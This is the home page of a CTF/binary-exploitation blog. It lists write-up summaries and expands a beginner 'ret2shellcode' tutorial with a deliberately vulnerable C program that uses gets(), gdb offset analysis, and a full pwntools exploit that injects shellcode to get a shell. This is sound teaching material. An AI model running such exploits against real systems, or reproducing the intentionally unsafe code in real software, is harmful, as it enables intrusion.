<!DOCTYPE html>
<html>
<head>
	<meta charset="utf-8">
	<title>stdnoerr's blog</title>
	
	<meta name="author" content="stdnoerr">

	<!-- Enable responsive viewport -->
	<meta name="viewport" content="width=device-width, initial-scale=1.0">

	<!-- Le HTML5 shim, for IE6-8 support of HTML elements -->
	<!--[if lt IE 9]>
	<script src="http://html5shim.googlecode.com/svn/trunk/html5.js"></script>
	<![endif]-->

	<!-- Le styles -->
	<link href="/assets/resources/bootstrap/css/bootstrap.min.css" rel="stylesheet">
	<link href="/assets/resources/font-awesome/css/font-awesome.min.css" rel="stylesheet">
	<link href="/assets/resources/syntax/syntax.css" rel="stylesheet">
	<link href="/assets/css/style.css" rel="stylesheet">

	<!-- Le fav and touch icons -->
	<!-- Update these with your own images
	<link rel="shortcut icon" href="images/favicon.ico">
	<link rel="apple-touch-icon" href="images/apple-touch-icon.png">
	<link rel="apple-touch-icon" sizes="72x72" href="images/apple-touch-icon-72x72.png">
	<link rel="apple-touch-icon" sizes="114x114" href="images/apple-touch-icon-114x114.png">
	-->

	<link rel="alternate" type="application/rss+xml" title="" href="/feed.xml">
</head>

<body>
	<nav class="navbar navbar-default visible-xs" role="navigation">
		<!-- Brand and toggle get grouped for better mobile display -->
		<div class="navbar-header">
			<button type="button" class="navbar-toggle" data-toggle="collapse" data-target="#bs-example-navbar-collapse-1">
				<span class="sr-only">Toggle navigation</span>
				<span class="icon-bar"></span>
				<span class="icon-bar"></span>
				<span class="icon-bar"></span>
			</button>
			
			<a type="button" class="navbar-toggle nav-link" href="http://github.com/stdnoerr">
				<i class="fa fa-github"></i>
			</a>
			
			
			<a type="button" class="navbar-toggle nav-link" href="http://twitter.com/stdnoerr">
				<i class="fa fa-twitter"></i>
			</a>
			
			
			<a type="button" class="navbar-toggle nav-link" href="mailto:stdnoerr@gmail.com">
				<i class="fa fa-envelope"></i>
			</a>
			
			<a class="navbar-brand" href="/">
				<img src="//www.gravatar.com/avatar/fe66ffe3df09aee77973014c55d36d1c?s=35" class="img-circle" />
				stdnoerr's blog
			</a>
		</div>

		<!-- Collect the nav links, forms, and other content for toggling -->
		<div class="collapse navbar-collapse" id="bs-example-navbar-collapse-1">
			<ul class="nav navbar-nav">
				<li class="active"><a href="/">Home</a></li>
				<li><a href="/categories.html">Categories</a></li>
				<li><a href="/tags.html">Tags</a></li>
			</ul>
		</div><!-- /.navbar-collapse -->
	</nav>

	<!-- nav-menu-dropdown -->
	<div class="btn-group hidden-xs" id="nav-menu">
		<button type="button" class="btn btn-default dropdown-toggle" data-toggle="dropdown">
			<i class="fa fa-bars"></i>
		</button>
		<ul class="dropdown-menu" role="menu">
			<li><a href="/"><i class="fa fa-home"></i>Home</a></li>
			<li><a href="/categories.html"><i class="fa fa-folder"></i>Categories</a></li>
			<li><a href="/tags.html"><i class="fa fa-tags"></i>Tags</a></li>
			<li class="divider"></li>
			<li><a href="#"><i class="fa fa-arrow-up"></i>Top of Page</a></li>
		</ul>
	</div>

	<div class="col-sm-3 sidebar hidden-xs" style="background: url(/assets/media/cover.jpg) no-repeat !important;">
		<!-- sidebar.html -->
<header class="sidebar-header" role="banner">
	<a href="/">
		<img src="//www.gravatar.com/avatar/fe66ffe3df09aee77973014c55d36d1c?s=150" class="img-circle" />
	</a>
	<h3 class="title">
        <a href="/">stdnoerr's blog</a>
    </h3>
</header>


<div id="bio" class="text-center">
	CTFer | pwner | wanna learn everything
</div>


<div id="contact-list" class="text-center">
	<ul class="list-unstyled list-inline">
		
		<li>
			<a class="btn btn-default btn-sm" href="https://github.com/stdnoerr">
				<i class="fa fa-github-alt fa-lg"></i>
			</a>
		</li>
		
		
		<li>
			<a class="btn btn-default btn-sm" href="https://twitter.com/stdnoerr">
				<i class="fa fa-twitter fa-lg"></i>
			</a>
		</li>
		
		
		<li>
			<a class="btn btn-default btn-sm" href="mailto:stdnoerr@gmail.com">
				<i class="fa fa-envelope fa-lg"></i>
			</a>
		</li>
		
	</ul>
	<ul id="contact-list-secondary" class="list-unstyled list-inline">
		
		
	</ul>
</div>
<!-- sidebar.html end -->

	</div>

	<div class="col-sm-9 col-sm-offset-3">
		<div class="page-header">
  <h1>stdnoerr's blog </h1>
</div>



<article class="home">

  <span class="post-date">
    
    November
    26th,
    
    2023
  </span>

  <h2>
    <a href="/writeup/2023/11/26/BlackHat-2024-Quals-CPL0.html">BlackHat 2024 2024 Quals - CPL0</a>
  </h2>

  <div>
    
    
    <p>I played BlackHat 2024 Qualifiers with <a href="https://team.airoverflow.com/">AirOverflow</a>. I didn’t get much time to play and only managed to solve CPL0.
The challenge provided a qemu patch and docker container files. I assumed that it was a kernel challenge but it turned out to be very different. Here’s how I solved it: -</p>

    
    
  </div>

</article>


<article class="home">

  <span class="post-date">
    
    August
    21st,
    
    2022
  </span>

  <h2>
    <a href="/writeup/2022/08/21/eBPF-exploitation-(ft.-D-3CTF-d3bpf).html">Learning eBPF exploitation</a>
  </h2>

  <div>
    
    
    <p>This post is gonna be about eBPF exploitation using a CTF challenge from D^3CTF named <code class="language-plaintext highlighter-rouge">d3bpf</code>. I have learnt so much while trying this challenge that I want to document all those findings and understanding as a future reference. All snippets gonna be from <code class="language-plaintext highlighter-rouge">v5.11</code> kernel as the challenge uses this version. Lets dig right in.</p>

    
    
  </div>

</article>


<article class="home">

  <span class="post-date">
    
    September
    28th,
    
    2021
  </span>

  <h2>
    <a href="/writeup/2021/09/28/HacktivityCTF2021-pawn-shop.html">HacktivityCTF 2021 - Pawn Shop</a>
  </h2>

  <div>
    
    
    <p>This is writeup for <code class="language-plaintext highlighter-rouge">Pawn Shop</code> challenge from HacktivityCTF 2021. This challenge is good for getting started with heap exploitation and similar/identical challenge are commonly seen in CTFs. You can download the challenge files <a href="https://github.com/stdnoerr/stdnoerr.github.io/tree/master/files/heap/pawn_shop_hacktivity2021">here</a>.</p>

    
    
  </div>

</article>


<article class="home">

  <span class="post-date">
    
    September
    19th,
    
    2021
  </span>

  <h2>
    <a href="/ctf/2021/09/19/ACSC2021.html">ACSC 2021 - Pwn challenges</a>
  </h2>

  <div>
    
    
    <p>I played ACSC this year. I only tried pwn challenges and was able to solve all pwn except Message Center. The challenges were pretty awesome and had new things to learn. I really enjoyed it. Here are writeups for the ones I solved.</p>

    
    
  </div>

</article>


<article class="home">

  <span class="post-date">
    
    September
    10th,
    
    2021
  </span>

  <h2>
    <a href="/kernel-pwn/2021/09/10/pass-grabcon.html">GrabCON 2021 - Paas</a>
  </h2>

  <div>
    
    
    <p>I played GrabCON CTF 2021 to check the challenges. “Pass” especially got my attention because it is a kernel exploitation challenge. I thought it is the best time I work on some kernel challenges. So, I will approach it as a beginner and try to explain as much as I can. I did not solve it during the CTF. Shoutout to <code class="language-plaintext highlighter-rouge">00xc#0275</code> from Scavengar Security for being the only person who solved it during the CTF. Checkout his <a href="https://scavengersecurity.com/posts/grabcon-paas/">writeup</a> also. You can download the challenge file <a href="https://github.com/stdnoerr/stdnoerr.github.io/tree/master/files/kernel/grabcon_pass/">here</a>.</p>

    
    
  </div>

</article>


<article class="home">

  <span class="post-date">
    
    July
    29th,
    
    2021
  </span>

  <h2>
    <a href="/pwn-training/2021/07/29/format-string-leaking.html">Format string - leaking</a>
  </h2>

  <div>
    
    
    <p>Today we are going to learn about format strings. This will be done with a challenge.
The challenge files can be found <a href="https://github.com/stdnoerr/stdnoerr.github.io/tree/master/files/fmtstr/flagleak">here</a></p>

    
    
  </div>

</article>


<article class="home">

  <span class="post-date">
    
    June
    14th,
    
    2021
  </span>

  <h2>
    <a href="/pwn-training/2021/06/14/ret2win.html">ret2win</a>
  </h2>

  <div>
    
    
    <p>Today we will try to do the last <a href="/pwn-training/2021/06/12/ret2shellcode.html">challenge</a> by another method. I will do the required analysis only this time because everything is same except the technique. We won’t do shellcoding this time.</p>

    
    
  </div>

</article>


<article class="home">

  <span class="post-date">
    
    June
    12th,
    
    2021
  </span>

  <h2>
    <a href="/pwn-training/2021/06/12/ret2shellcode.html">ret2shellcode</a>
  </h2>

  <div>
    
    
    <p>We will take a look at a ret2shellcode challenge.
The files can be found <a href="https://github.com/stdnoerr/stdnoerr.github.io/tree/master/files/stack/ret2shellcode">here</a>.</p>

<h1 id="analysis">Analysis</h1>
<h2 id="code-analysis">Code Analysis</h2>
<p>Lets take a look at the source code.</p>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include</span><span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
</span>
<span class="c1">// Compiled with: gcc ret2shellcode.c -o ret2shellcode -z execstack -no-pie -fno-stack-protector </span>

<span class="n">__attribute__</span><span class="p">((</span><span class="n">constructor</span><span class="p">))</span>
<span class="kt">void</span> <span class="nf">ignore_me</span><span class="p">(){</span>
    <span class="n">setbuf</span><span class="p">(</span><span class="n">stdin</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
    <span class="n">setbuf</span><span class="p">(</span><span class="n">stdout</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
    <span class="n">setbuf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
<span class="p">}</span>

<span class="kt">void</span> <span class="nf">win</span><span class="p">(</span><span class="kt">int</span> <span class="n">arg1</span><span class="p">,</span> <span class="kt">int</span> <span class="n">arg2</span><span class="p">){</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">arg1</span> <span class="o">==</span> <span class="mh">0xdeadbeef</span> <span class="o">&amp;&amp;</span> <span class="n">arg2</span> <span class="o">==</span> <span class="mh">0xcafebabe</span><span class="p">){</span>
        <span class="n">puts</span><span class="p">(</span><span class="s">"You're awesome"</span><span class="p">);</span>
        <span class="n">execve</span><span class="p">(</span><span class="s">"/bin/sh"</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
    <span class="p">}</span>
<span class="p">}</span>

<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">environ</span><span class="p">){</span>
    <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mh">0x60</span><span class="p">];</span>
    <span class="n">puts</span><span class="p">(</span><span class="s">"Show me your creativity :P"</span><span class="p">);</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">"For now, Imma tell you a secret: %p</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">buf</span><span class="p">);</span>
    <span class="n">gets</span><span class="p">(</span><span class="n">buf</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div></div>

<p>The program has three functions; ignore_me, win and main. <em>main</em> is a special function in C language. It is where the main functionality of the program lies. <em>ignore_me</em> is declared as a constructor here. Constructors are functions which are executed <em>before</em> main. Their counterparts are called de-constructors. They are executed <em>after</em> main.</p>

<p>Here <em>ignore_me</em> just sets up buffering for the challenge.</p>

<p>Lets take a closer look at <em>main</em> function. The function first allocates 0x60 bytes for a buffer called <em>buf</em>. Then it prints two lines. The first one is not important. The second one tells us the address of buf buffer. After that, it calls gets function. The <a href="https://man7.org/linux/man-pages/man3/gets.3.html">man page of gets</a> shouts “Never use this function”. Because, this function does not check if the destionation buffer can hold the data. This gives rise to buffer overflow.</p>

<p>And the <em>win</em> function compares the first and second argument with some specific values and gives us shell if they match.</p>

<h3 id="buffer-overflow">Buffer Overflow</h3>
<p>This is a situation in which a program puts data in a buffer more than its capacity. This results in overwriting memory adjacent to the data region. Mostly, buffers are on stack and sensitive data related to program execution is also stored on stack. This way buffer overflows can be a serious threat in a computer program.</p>

<p>Buffer overflow attacks overwrite the data related to program execution and control the program’s execution. The most important data on stack is saved RIP/EIP. This is the address where the program will start execution after main function. Overwriting it with something useful can get us a shell.</p>

<p>Getting shell usually depends upon the situation.</p>

<h1 id="exploitation">Exploitation</h1>
<h2 id="checksec">Checksec</h2>
<p>Lets first check protections enabled on the binary. This can be done with checksec tool. It comes with <a href="https://github.com/Gallopsled/pwntools">pwntools</a> also.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Arch:     amd64-64-little
RELRO:    Partial RELRO
Stack:    No canary found
NX:       NX disabled
PIE:      No PIE <span class="o">(</span>0x400000<span class="o">)</span>
RWX:      Has RWX segments
</code></pre></div></div>

<ul>
  <li>Arch: tells architecture of binary.</li>
  <li>RELRO: tells if the GOT section is read-only or not. There are three situtation of RELRO:
    <ol>
      <li>NO RELRO: GOT section is not read-only and it is <em>after</em> global variables.</li>
      <li>Partial RELRO: GOT section is not read-only and it is <em>before</em> global variables.</li>
      <li>Full RELRO: GOT section is read-only and it is <em>before</em> global variables.</li>
    </ol>
  </li>
  <li>Stack: tells if canary protection is enabled or not.</li>
  <li>NX: tells if non-executable stack protection is enabled or not.</li>
  <li>PIE: tells if Position Independent Execution is enabled or not.</li>
  <li>RWX: tells if binary has read-write-executable pages.</li>
</ul>

<p>In this case, RELRO, Canary, NX and PIE are disabled.</p>

<h2 id="buffer-overflow-exploitation">Buffer Overflow Exploitation</h2>
<p>In Buffer Overflow attacks, first we calculate number of bytes until we reach saved RIP. We usually call it “offset”. This can be calculated using cyclic patterns.</p>

<h3 id="offset-calculation">Offset calculation</h3>
<p>For calculation of offset, we need to generate cyclic pattern which will possibly overwrite saved RIP. If your guess didn’t overwrite RIP, just increase it.</p>

<ol>
  <li>I generated cyclic pattern of 150 bytes using <code class="language-plaintext highlighter-rouge">cyclic 150</code>.<br /></li>
  <li>Copy the resulting pattern.<br /></li>
  <li>Start the program in gdb using <code class="language-plaintext highlighter-rouge">gdb ./ret2shellcode</code>.<br /></li>
  <li>Paste the copied pattern and you should get a Segmentation Fault error. This shows that you overwrote the saved RIP.<br />
It should be something like this:</li>
</ol>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Program received signal SIGSEGV, Segmentation fault.
0x0000000000401238 <span class="k">in </span>main <span class="o">()</span>
<span class="o">[</span> Legend: Modified register | Code | Heap | Stack | String <span class="o">]</span>
<span class="nv">$rax</span>   : 0x0               
<span class="nv">$rbx</span>   : 0x0               
<span class="nv">$rcx</span>   : 0x00007ffff7f9f980  →  0x00000000fbad208b
<span class="nv">$rdx</span>   : 0x0               
<span class="nv">$rsp</span>   : 0x00007fffffffdfb8  →  <span class="s2">"baabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabma"</span>
<span class="nv">$rbp</span>   : 0x6261617a61616179 <span class="o">(</span><span class="s2">"yaaazaab"</span>?<span class="o">)</span>
<span class="nv">$rsi</span>   : 0x00007ffff7f9fa03  →  0xfa2680000000000a
<span class="nv">$rdi</span>   : 0x00007ffff7fa2680  →  0x0000000000000000
<span class="nv">$rip</span>   : 0x0000000000401238  →  &lt;main+78&gt; ret 
<span class="nv">$r8</span>    : 0x00007fffffffdf50  →  <span class="s2">"aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaama[...]"</span>
<span class="nv">$r9</span>    : 0x0               
<span class="nv">$r10</span>   : 0x00007ffff7fef110  →  &lt;strcmp+4144&gt; pxor xmm0, xmm0
<span class="nv">$r11</span>   : 0x246             
<span class="nv">$r12</span>   : 0x0000000000401080  →  &lt;_start+0&gt; xor ebp, ebp
<span class="nv">$r13</span>   : 0x0               
<span class="nv">$r14</span>   : 0x0               
<span class="nv">$r15</span>   : 0x0               
<span class="nv">$eflags</span>: <span class="o">[</span>zero carry parity adjust sign <span class="nb">trap </span>INTERRUPT direction overflow RESUME virtualx86 identification]
<span class="nv">$cs</span>: 0x0033 <span class="nv">$ss</span>: 0x002b <span class="nv">$ds</span>: 0x0000 <span class="nv">$es</span>: 0x0000 <span class="nv">$fs</span>: 0x0000 <span class="nv">$gs</span>: 0x0000 

0x00007fffffffdfb8│+0x0000: <span class="s2">"baabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabma"</span>     ← <span class="nv">$rsp</span>
0x00007fffffffdfc0│+0x0008: <span class="s2">"daabeaabfaabgaabhaabiaabjaabkaablaabma"</span>
0x00007fffffffdfc8│+0x0010: <span class="s2">"faabgaabhaabiaabjaabkaablaabma"</span>
0x00007fffffffdfd0│+0x0018: <span class="s2">"haabiaabjaabkaablaabma"</span>
0x00007fffffffdfd8│+0x0020: <span class="s2">"jaabkaablaabma"</span>
0x00007fffffffdfe0│+0x0028: 0x0000616d6261616c <span class="o">(</span><span class="s2">"laabma"</span>?<span class="o">)</span>
0x00007fffffffdfe8│+0x0030: 0x2ced48e1cc2282d4
0x00007fffffffdff0│+0x0038: 0x0000000000401080  →  &lt;_start+0&gt; xor ebp, ebp

0x40122d &lt;main+67&gt;        call   0x401070 &lt;gets@plt&gt;
0x401232 &lt;main+72&gt;        mov    eax, 0x0
0x401237 &lt;main+77&gt;        leave  
→   0x401238 &lt;main+78&gt;        ret    
<span class="o">[!]</span> Cannot disassemble from <span class="nv">$PC</span>
</code></pre></div></div>
<p><strong>Note</strong>: I’m using <a href="https://github.com/hugsy/gef">gdb-gef</a> plugin.<br /></p>
<ol>
  <li>To calculate the offset, copy the first four characters on top of stack. It is “baab” in this case. Or you can also calculate it by copying the first word on stack. It can be determined by <code class="language-plaintext highlighter-rouge">x/wx $rsp</code>.<br /></li>
  <li>To get the offset, give the four characters or first word on stack by <code class="language-plaintext highlighter-rouge">cyclic -l &lt;value&gt;</code>. This yields 104 (0x68).</li>
</ol>

<p>There is a strong correspondence between the calculated offset and the source code. The buffer is of size 0x60 and the offset is 0x68. But, why is it <code class="language-plaintext highlighter-rouge">sizeof(buf)+8</code>?<br />
This is because the stack(frame) of main function contains only <em>buf</em> buffer. It is adjacent to the sensitive data I was talking about earlier. The sensitive data is saved RBP and saved RIP. saved RBP is the base pointer which will be used when main returns. After saved RBP, comes saved RIP. That’s why we need 8 more bytes to get upto saved RIP.</p>

<h3 id="ret2shellcode">ret2shellcode</h3>
<p>Now we have RIP under-control. But, <a href="https://hackmd.io/@stdnoerr/rip_control">what now</a>?
Since NX is disabled, the easiest way is to execute a shellcode which gives us a shell.<br />
But, for this, we need to have something where we can put it and we need to know its location in order to return to it.<br />
Luckily, both of these requirements are satisfied in this situation. We have a buffer we can write to and the program gives us its address.<br />
Lets start writing our exploit script.<br /></p>
<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/env python3
</span><span class="kn">from</span> <span class="n">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="k">def</span> <span class="nf">start</span><span class="p">():</span>
	<span class="k">global</span> <span class="n">p</span>
	<span class="k">if</span> <span class="n">args</span><span class="p">.</span><span class="n">REMOTE</span><span class="p">:</span>
		<span class="n">p</span> <span class="o">=</span> <span class="nf">remote</span><span class="p">(</span><span class="sh">'</span><span class="s">localhost</span><span class="sh">'</span><span class="p">,</span> <span class="mi">1337</span><span class="p">)</span>
	<span class="k">else</span><span class="p">:</span>
		<span class="n">p</span> <span class="o">=</span> <span class="n">elf</span><span class="p">.</span><span class="nf">process</span><span class="p">()</span>

<span class="n">context</span><span class="p">.</span><span class="n">binary</span> <span class="o">=</span> <span class="n">elf</span> <span class="o">=</span> <span class="nc">ELF</span><span class="p">(</span><span class="sh">'</span><span class="s">./ret2shellcode</span><span class="sh">'</span><span class="p">)</span>
<span class="n">libc</span> <span class="o">=</span> <span class="n">elf</span><span class="p">.</span><span class="n">libc</span>
<span class="nf">start</span><span class="p">()</span>

<span class="c1">### Exploit Goes here ###
</span><span class="n">offset</span> <span class="o">=</span> <span class="mh">0x68</span>

<span class="n">p</span><span class="p">.</span><span class="nf">interactive</span><span class="p">()</span>
<span class="n">p</span><span class="p">.</span><span class="nf">close</span><span class="p">()</span>
</code></pre></div></div>
<p>First we need to store buffer’s address which is printed by the binary.</p>
<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">p</span><span class="p">.</span><span class="nf">recvline</span><span class="p">()</span>
<span class="n">buf_addr</span> <span class="o">=</span> <span class="nf">int</span><span class="p">(</span><span class="n">p</span><span class="p">.</span><span class="nf">recvline</span><span class="p">().</span><span class="nf">split</span><span class="p">()[</span><span class="o">-</span><span class="mi">1</span><span class="p">],</span> <span class="mi">16</span><span class="p">)</span>
</code></pre></div></div>
<p>Then the shellcode we want to execute. I used pwntools shellcraft utility for this.</p>
<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">shellcode</span> <span class="o">=</span> <span class="nf">asm</span><span class="p">(</span><span class="n">shellcraft</span><span class="p">.</span><span class="n">linux</span><span class="p">.</span><span class="nf">sh</span><span class="p">())</span>
</code></pre></div></div>
<p>Now we need to craft such a payload which will overwrite the RIP with buffer’s address and the buffer contains the shellcode.</p>
<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1"># store the shellcode
</span><span class="n">payload</span> <span class="o">=</span> <span class="n">shellcode</span>
<span class="c1"># Add junk until we reach saved RIP
</span><span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">'</span><span class="s">A</span><span class="sh">'</span><span class="o">*</span><span class="p">(</span><span class="n">offset</span> <span class="o">-</span> <span class="nf">len</span><span class="p">(</span><span class="n">shellcode</span><span class="p">))</span>
<span class="c1"># Overwrite RIP with buf's address
</span><span class="n">payload</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">buf_addr</span><span class="p">)</span>
</code></pre></div></div>
<p>Now just send the payload.</p>
<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1"># sendline because gets waits until a newline(\n)
</span><span class="n">p</span><span class="p">.</span><span class="nf">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
</code></pre></div></div>
<p>Then communicate with the program by going interactive.</p>
<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">p</span><span class="p">.</span><span class="nf">interactive</span><span class="p">()</span>
</code></pre></div></div>
<p>And BOOM! you have a shell.</p>

<h2 id="final-exploit">Final Exploit</h2>
<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/env python3
</span><span class="kn">from</span> <span class="n">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="k">def</span> <span class="nf">start</span><span class="p">():</span>
	<span class="k">global</span> <span class="n">p</span>
	<span class="k">if</span> <span class="n">args</span><span class="p">.</span><span class="n">REMOTE</span><span class="p">:</span>
		<span class="n">p</span> <span class="o">=</span> <span class="nf">remote</span><span class="p">(</span><span class="sh">'</span><span class="s">localhost</span><span class="sh">'</span><span class="p">,</span> <span class="mi">1337</span><span class="p">)</span>
	<span class="k">else</span><span class="p">:</span>
		<span class="n">p</span> <span class="o">=</span> <span class="n">elf</span><span class="p">.</span><span class="nf">process</span><span class="p">()</span>

<span class="n">context</span><span class="p">.</span><span class="n">binary</span> <span class="o">=</span> <span class="n">elf</span> <span class="o">=</span> <span class="nc">ELF</span><span class="p">(</span><span class="sh">'</span><span class="s">./ret2shellcode</span><span class="sh">'</span><span class="p">)</span>
<span class="n">libc</span> <span class="o">=</span> <span class="n">elf</span><span class="p">.</span><span class="n">libc</span>
<span class="nf">start</span><span class="p">()</span>

<span class="c1">### Exploit Goes here ###
</span><span class="n">offset</span> <span class="o">=</span> <span class="mh">0x68</span>

<span class="n">p</span><span class="p">.</span><span class="nf">recvline</span><span class="p">()</span>
<span class="n">buf_addr</span> <span class="o">=</span> <span class="nf">int</span><span class="p">(</span><span class="n">p</span><span class="p">.</span><span class="nf">recvline</span><span class="p">().</span><span class="nf">split</span><span class="p">()[</span><span class="o">-</span><span class="mi">1</span><span class="p">],</span> <span class="mi">16</span><span class="p">)</span>

<span class="n">shellcode</span> <span class="o">=</span> <span class="nf">asm</span><span class="p">(</span><span class="n">shellcraft</span><span class="p">.</span><span class="n">linux</span><span class="p">.</span><span class="nf">sh</span><span class="p">())</span>

<span class="c1"># store the shellcode
</span><span class="n">payload</span> <span class="o">=</span> <span class="n">shellcode</span>
<span class="c1"># Add junk until we reach saved RIP
</span><span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">'</span><span class="s">A</span><span class="sh">'</span><span class="o">*</span><span class="p">(</span><span class="n">offset</span> <span class="o">-</span> <span class="nf">len</span><span class="p">(</span><span class="n">shellcode</span><span class="p">))</span>
<span class="c1"># Overwrite RIP with buf's address
</span><span class="n">payload</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">buf_addr</span><span class="p">)</span>

<span class="c1"># sendline because gets waits until a newline(\n)
</span><span class="n">p</span><span class="p">.</span><span class="nf">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>

<span class="n">p</span><span class="p">.</span><span class="nf">interactive</span><span class="p">()</span>
<span class="n">p</span><span class="p">.</span><span class="nf">close</span><span class="p">()</span>
</code></pre></div></div>
<p>If any of you have any questions/doubts, you can reach out to me on discord (stdnoerr#7880) or on twitter (@stdnoerr).</p>

    
    
  </div>

</article>

<hr/>

<ul class="pager"> 

  
  <li class="previous disabled">
    <a>&larr; Newer</a>
  </li>
  
  
  <li>
    <span class="page_number">Page: 1 of 1</span>
  </li>

  
  <li class="next disabled">
    <a>Older &rarr;</a>        
  </li>
  

</ul>




		<footer>
			<hr/>
			<p>
				&copy; 2024 stdnoerr with <a href="http://jekyllrb.com/">Jekyll</a>. Theme: <a href="https://github.com/dbtek/dbyll">dbyll</a> by dbtek.
			</p>
		</footer>
	</div>

	<script type="text/javascript" src="/assets/resources/jquery/jquery.min.js"></script>
	<script type="text/javascript" src="/assets/resources/bootstrap/js/bootstrap.min.js"></script>
	<script type="text/javascript" src="/assets/js/app.js"></script>
</body>
</html>



<!-- Asynchronous Google Analytics snippet -->
<script>
  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
  })(window,document,'script','https://www.google-analytics.com/analytics.js','ga');

  ga('create', 'stdnoerr_blog', 'auto');
  ga('send', 'pageview');
</script>

